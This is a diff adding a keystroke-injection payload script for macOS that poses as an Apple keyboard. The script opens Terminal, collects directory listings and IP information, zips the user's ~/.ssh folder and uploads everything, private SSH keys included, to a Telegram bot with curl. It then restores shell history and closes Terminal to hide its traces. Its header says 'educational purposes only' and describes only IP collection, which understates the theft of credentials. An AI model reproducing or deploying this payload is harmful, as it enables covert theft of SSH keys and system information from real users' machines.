@@ -1,0 +1,84 @@
+ID abcd:1234 Apple:Keyboard
+REM This script will obtain the public IP address information of the machine via the 'curl' command, send it back via Telegram, and perform basic cleanup.
+REM This is for educational purposes only
+REM Author: "Anthony V <avltree9798>"
+REM Version: 1.0
+REM Category: exfiltration
+
+DELAY 1000
+GUI SPACE
+DELAY 1000
+STRING Terminal
+DELAY 1000
+ENTER
+DELAY 100
+STRING cp ~/.zsh_history ~/.zsh_history_backup
+DELAY 1000
+ENTER
+DELAY 100
+STRING ls -lah /Library/PrivilegedHelperTools > /tmp/PrivilegedHelperTools.txt
+DELAY 1000
+ENTER
+DELAY 100
+STRING ls -lah ~ > /tmp/Home.txt
+DELAY 1000
+ENTER
+DELAY 100
+STRING ls -lah /Applications > /tmp/Applications.txt
+DELAY 1000
+ENTER
+DELAY 100
+STRING curl ipinfo.io > /tmp/ipinfo.txt
+DELAY 1000
+ENTER
+DELAY 100
+STRING zip -r /tmp/ssh_keys.zip ~/.ssh
+DELAY 1000
+ENTER
+STRING export TELEGRAM_API_TOKEN="TELEGRAM_API_TOKEN"
+DELAY 1000
+ENTER
+DELAY 100
+STRING export TELEGRAM_CHAT_ID="TELEGRAM_CHAT_ID"
+DELAY 1000
+ENTER
+DELAY 100
+STRING curl -v -s -X POST https://api.telegram.org/bot$TELEGRAM_API_TOKEN/sendMessage -d chat_id=$TELEGRAM_CHAT_ID -d text="Information from `hostname`"
+DELAY 1000
+ENTER
+DELAY 100
+STRING curl -v -F chat_id=$TELEGRAM_CHAT_ID -F "document=@/tmp/PrivilegedHelperTools.txt" -F "filename=PrivilegedHelperTools.txt" https://api.telegram.org/bot$TELEGRAM_API_TOKEN/sendDocument
+DELAY 1000
+ENTER
+DELAY 100
+STRING curl -v -F chat_id=$TELEGRAM_CHAT_ID -F "document=@/tmp/Home.txt" -F "filename=Home.txt" https://api.telegram.org/bot$TELEGRAM_API_TOKEN/sendDocument
+DELAY 1000
+ENTER
+DELAY 100
+STRING curl -v -F chat_id=$TELEGRAM_CHAT_ID -F "document=@/tmp/Applications.txt" -F "filename=Applications.txt" https://api.telegram.org/bot$TELEGRAM_API_TOKEN/sendDocument
+DELAY 1000
+ENTER
+DELAY 100
+STRING curl -v -F chat_id=$TELEGRAM_CHAT_ID -F "document=@/tmp/ipinfo.txt" -F "filename=ipinfo.txt" https://api.telegram.org/bot$TELEGRAM_API_TOKEN/sendDocument
+DELAY 1000
+ENTER
+DELAY 100
+STRING curl -v -F chat_id=$TELEGRAM_CHAT_ID -F "document=@/tmp/ssh_keys.zip" -F "filename=ssh_keys.zip" https://api.telegram.org/bot$TELEGRAM_API_TOKEN/sendDocument
+DELAY 1000
+ENTER
+DELAY 100
+STRING unset TELEGRAM_API_TOKEN TELEGRAM_CHAT_ID MESSAGE
+DELAY 1000
+ENTER
+DELAY 100
+STRING mv ~/.zsh_history_backup ~/.zsh_history
+DELAY 1000
+ENTER
+DELAY 100
+STRING killall KeyboardSetupAssistant
+DELAY 1000
+ENTER
+DELAY 100
+STRING killall Terminal
+DELAY 1000
+ENTER
